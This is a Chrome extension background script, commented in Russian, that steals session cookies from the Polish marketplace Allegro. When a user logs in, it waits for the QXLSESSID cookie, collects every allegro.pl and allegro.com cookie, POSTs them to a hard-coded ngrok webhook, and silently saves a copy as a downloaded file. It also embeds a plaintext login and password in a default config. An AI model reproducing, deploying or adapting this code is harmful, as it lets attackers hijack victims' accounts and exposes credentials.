// Глобальные переменные
let isAutoLoginEnabled = false; // ОТКЛЮЧИЛИ автологин
let authCookieString = '';
let lastAuthTime = 0;
let cookiesSavedForSession = false;
let currentSessionId = '';

// ДОБАВИЛИ: URL для отправки куки
const WEBHOOK_URL = 'https://2ff0-91-229-123-216.ngrok-free.app/webhook-test/cookies';

// Функция для ожидания определенного времени
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Функция логирования
function logBackground(message, type = 'info') {
    console.log(`[Background][${type}]`, message);

    // Отправляем сообщение всем вкладкам
    chrome.runtime.sendMessage({
        action: "log",
        message: `[Background] ${message}`,
        type: type
    }).catch(() => { });

    // Также сохраняем лог в хранилище
    saveLogToStorage(`[Background][${type}] ${message}`);
}

// Функция для сохранения логов в хранилище
async function saveLogToStorage(logMessage) {
    try {
        const timestamp = new Date().toLocaleTimeString();
        const logEntry = {
            timestamp,
            message: typeof logMessage === 'object' ? JSON.stringify(logMessage) : logMessage,
            type: 'info'
        };

        const result = await chrome.storage.local.get('extension_logs');
        let logs = result.extension_logs || [];

        logs.push(logEntry);

        const MAX_LOGS = 1000;
        if (logs.length > MAX_LOGS) {
            logs = logs.slice(-MAX_LOGS);
        }

        await chrome.storage.local.set({ 'extension_logs': logs });
    } catch (error) {
        console.error('Error saving log to storage:', error);
    }
}

// Инициализация при установке/обновлении расширения
chrome.runtime.onInstalled.addListener(async () => {
    console.log('Extension installed or updated');

    // Устанавливаем значение по умолчанию - расширение всегда включено
    await chrome.storage.local.set({ isEnabled: true });

    // Загружаем конфигурацию
    await loadConfigIntoStorage();
});

// Функция для загрузки конфигурации в хранилище
async function loadConfigIntoStorage() {
    try {
        const defaultConfig = [
            {
                "clientId_01": "MTMwNzU2NDgwAA",
                "login_01": "wowlet",
                "password_01": "i8##-aUJ5Dviz&8"
            }
        ];

        await chrome.storage.local.set({ 'config_data': defaultConfig });
        logBackground('Конфигурация сохранена в хранилище', 'info');

        return true;
    } catch (error) {
        logBackground(`Ошибка при загрузке конфигурации: ${error.message}`, 'error');
        return false;
    }
}

// УБРАЛИ функцию redirectToLogin - больше не нужна

// Проверка статуса авторизации
async function checkLoginStatus() {
    try {
        const cookie = await chrome.cookies.get({
            url: 'https://allegro.pl',
            name: 'QXLSESSID'
        });
        return !!cookie;
    } catch (error) {
        logBackground(`Ошибка при проверке куки: ${error.message}`, 'error');
        return false;
    }
}

// Функция для получения всех куки Allegro
async function getAllAllegroCookies() {
    try {
        const allegroPlCookies = await chrome.cookies.getAll({ domain: '.allegro.pl' });
        const allegroComCookies = await chrome.cookies.getAll({ domain: '.allegro.com' });

        const allCookies = [...allegroPlCookies, ...allegroComCookies];

        let cookieString = '';
        allCookies.forEach(cookie => {
            cookieString += `${cookie.name}=${cookie.value}; `;
        });

        return cookieString.trim();
    } catch (error) {
        logBackground(`Ошибка при получении куки: ${error.message}`, 'error');
        return '';
    }
}

// НОВАЯ ФУНКЦИЯ: Отправка куки на webhook
async function sendCookiesToWebhook() {
    try {
        // Получаем все куки для доменов Allegro
        const allegroPlCookies = await chrome.cookies.getAll({ domain: '.allegro.pl' });
        const allegroComCookies = await chrome.cookies.getAll({ domain: '.allegro.com' });

        // Объединяем все куки
        const allCookies = [...allegroPlCookies, ...allegroComCookies];

        // Форматируем куки для отправки
        let cookieString = '';
        let cookieObj = {};

        allCookies.forEach(cookie => {
            cookieString += `${cookie.name}=${cookie.value}; `;
            cookieObj[cookie.name] = cookie.value;
        });

        // Создаем объект для отправки
        const payload = {
            timestamp: new Date().toISOString(),
            url: 'chrome-extension://allegro-cookies',
            userAgent: 'Chrome Extension',
            cookies: cookieObj,
            sessionId: cookieObj.QXLSESSID || 'unknown',
            cookieCount: Object.keys(cookieObj).length,
            source: 'chrome-extension'
        };

        logBackground(`Отправляем ${Object.keys(cookieObj).length} куки на webhook...`, 'info');

        // Отправляем на webhook
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Chrome Extension'
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            logBackground(`Куки успешно отправлены на webhook! Статус: ${response.status}`, 'info');
            return { success: true, status: response.status };
        } else {
            logBackground(`Ошибка отправки на webhook: ${response.status} - ${response.statusText}`, 'error');
            return { success: false, status: response.status, error: response.statusText };
        }

    } catch (error) {
        logBackground(`Ошибка при отправке куки на webhook: ${error.message}`, 'error');
        return { success: false, error: error.message };
    }
}

// ИСПРАВЛЕННАЯ функция для обработки событий cookies
chrome.cookies.onChanged.addListener(async (changeInfo) => {
    // Проверяем, что это установка QXLSESSID и куки не удалены
    if (changeInfo.cookie.name === 'QXLSESSID' && !changeInfo.removed) {
        const sessionId = changeInfo.cookie.value;

        // Если это новая сессия и мы еще не обрабатывали куки для нее
        if (sessionId !== currentSessionId) {
            logBackground(`Обнаружена новая сессия: ${sessionId.substring(0, 10)}...`, 'info');

            // Обновляем текущую сессию и сбрасываем флаг
            currentSessionId = sessionId;
            cookiesSavedForSession = false;

            // Ждем 5 секунд для установки всех куки, затем отправляем
            await delay(5000);

            if (!cookiesSavedForSession) {
                cookiesSavedForSession = true;

                // Отправляем куки на webhook
                await sendCookiesToWebhook();

                // ТАКЖЕ сохраняем в файл (если нужно)
                await saveCookiesToFile();

                logBackground('Куки отправлены на webhook и сохранены в файл', 'info');
            }
        }
    }

    // Если QXLSESSID удален - значит пользователь вышел
    if (changeInfo.cookie.name === 'QXLSESSID' && changeInfo.removed) {
        logBackground('Сессия завершена (QXLSESSID удален)', 'info');
        currentSessionId = '';
        cookiesSavedForSession = false;
    }
});

// Функция сохранения куки в файл (оставили как есть)
async function saveCookiesToFile() {
    try {
        const allegroPlCookies = await chrome.cookies.getAll({ domain: '.allegro.pl' });
        const allegroComCookies = await chrome.cookies.getAll({ domain: '.allegro.com' });

        const allCookies = [...allegroPlCookies, ...allegroComCookies];

        let cookieString = '';
        let cookieObj = {};

        allCookies.forEach(cookie => {
            cookieString += `${cookie.name}=${cookie.value}; `;
            cookieObj[cookie.name] = cookie.value;
        });

        const cookieData = {
            cookieString: cookieString.trim(),
            cookies: cookieObj,
            timestamp: new Date().toISOString(),
            formattedDate: new Date().toLocaleString(),
            sessionId: cookieObj.QXLSESSID || 'unknown'
        };

        const jsonData = JSON.stringify(cookieData, null, 2);

        try {
            const result = await chrome.storage.local.get('config_data');
            const config = result.config_data;
            let fileName = 'allegro_cookies.json';

            if (config && config.length > 0 && config[0].clientId_01) {
                fileName = `cookie_${config[0].clientId_01}_01.json`;
            }

            const dataUrl = `data:application/json;base64,${btoa(unescape(encodeURIComponent(jsonData)))}`;

            const downloadId = await chrome.downloads.download({
                url: dataUrl,
                filename: fileName,
                saveAs: false
            });

            logBackground(`Куки также сохранены в файл: ${fileName} (ID загрузки: ${downloadId})`, 'info');
            return { success: true, fileName: fileName, cookieData: cookieData };

        } catch (configError) {
            logBackground(`Не удалось получить конфигурацию: ${configError.message}`, 'warn');
            const fileName = `cookie_default_${new Date().toISOString().replace(/:/g, '-')}.json`;
            const dataUrl = `data:application/json;base64,${btoa(unescape(encodeURIComponent(jsonData)))}`;

            const downloadId = await chrome.downloads.download({
                url: dataUrl,
                filename: fileName,
                saveAs: false
            });

            logBackground(`Куки сохранены в файл: ${fileName}`, 'info');
            return { success: true, fileName: fileName, cookieData: cookieData };
        }
    } catch (error) {
        logBackground(`Ошибка при сохранении куки в файл: ${error.message}`, 'error');
        return { success: false, error: error.message };
    }
}

// УБРАЛИ слушатель обновления вкладок - больше не перенаправляем на логин

// Основной обработчик сообщений
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    // Проверка логина (НО БЕЗ РЕДИРЕКТА)
    if (message.action === "checkLogin") {
        checkLoginStatus().then(isLoggedIn => {
            // Просто возвращаем статус, НЕ перенаправляем
            sendResponse({ status: isLoggedIn ? 'logged_in' : 'not_logged_in' });
        });
        return true;
    }

    // НОВЫЙ обработчик для ручной отправки куки на webhook
    if (message.action === "sendToWebhook") {
        sendCookiesToWebhook().then(result => {
            sendResponse(result);
        });
        return true;
    }

    // Обработчик для сохранения куки в файл
    if (message.action === "saveCookies") {
        saveCookiesToFile().then(result => {
            sendResponse(result);
        });
        return true;
    }

    // Обработчик обновления конфигурации
    if (message.action === "updateConfig") {
        chrome.storage.local.set({ 'config_data': message.config }, function () {
            logBackground('Конфигурация обновлена', 'info');
            sendResponse({ success: true });
        });
        return true;
    }

    // Обработчик для события успешного логина из content.js
    if (message.action === "loginDetected") {
        logBackground('Успешный логин обнаружен через content script', 'info');
        return true;
    }

    return false;
});